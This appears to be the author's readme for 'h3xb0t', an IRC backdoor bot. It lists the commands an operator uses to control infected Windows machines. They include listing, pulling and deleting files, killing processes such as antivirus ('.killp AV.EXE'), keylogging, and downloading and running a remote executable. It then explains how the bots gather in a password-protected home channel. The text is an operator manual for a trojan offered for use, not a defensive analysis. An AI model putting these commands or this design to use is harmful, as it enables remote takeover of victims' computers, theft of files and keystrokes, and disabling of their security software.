Hi guys!

h3xb0t commands are:

------------------------------------------+
"."        - this is prefix.U can change  |
if u want.                                |
.login     - u must be login to send      |
commands to bot                           |
.op        - Give op to someone           |.op #chan nick                     
.deop      - Deop someone        	  |.deop #chan nick                  
.v         - Give voice      		  |.v    #chan nick                   
.-v        - ..               		  |					 
.kick      - kick someone     		  |.kick #chan nick reason(Example    
.ban       - ban someone      		  |.ban #chan  nick
.unban     -  unban someone    		  |.unban #chan nick
.join      - bot joins to chan            |.join #chan  
.part      - bot leave chan     	  |.part #chan
.logout    - u r logged out and u         |
cant send commands anymore                |
.hop       - bot leave and join #chan     |.hop #chan pass - if the pass is set to chan
.reconnect - bot reconnects               |
.rndnick   - bot change nick randomly     |
.die       - exit program	          |
.raw       - bot send command to server   |.raw PRIVMSG #b0t :Whatzzz up?
.status    - How long bot is connected to |
server					  |
.dns       - get ip from hostname         |.dns www.google.com
.listf     - listf files from some dir    |.listf C:\windows\*.*
.get       - bot send u a file through DCC|.get C:\log.txt
.killp     - kill process                 |.killp AV.EXE
.listp     - list processes               |
.listd     - list drives	          |
.run       -  run file param show(true/F) |.run C:\windows\notepad.exe c:\log.txt true
.makedir   - make directory               |.makedir C:\test
.removedir - remove directory             |.removedir C:\test      
.del       - delete file                  |.del C:\log.txt
.ren       - rename file                  |.ren C:\windows\notepad.exe C:\windows\shit.exe
.threads   - list threads		  |
.killthr   - kill thread                  |.killthr 0
.keyspy    - ..			          |
.keystop				  |
.delay     - run some commands for x times|.delay 10 .msg #b0t Test | .delay 10 .hop #b0t 
.download  - download path run(true/false)|.download www.mysite.com/file.exe C:\file.exe true
.msg       - bot send message             |.msg #b0t HEYA!
.notice    - ...same like msg	          |
------------------------------------------+
READ THIS:

When bots connect to server it will join HomeChan and when it join it will set ChanPass.
But if it cant join bot will join to BacChan.
U CAN ONLY send commands to bot on pvt or on a HomeChan/BackChan.
When u r kicked or u leave HomeChan/BackChan bot will remove u from login list and 
u must loggin again.When bots reconnect it will remove all users from login list.
There is bug when u send file to bot through DCC.Fix it.
Bot is coded for msvc 6.0.
Greetz go to:izee(thx for testing bot man),DiA,dr3f,blueowl,Genetix(leave JS viruses),cr4zy_y0mu aka akmon.

Sorry for bad English.

mail: dark_bera@hotmail.com

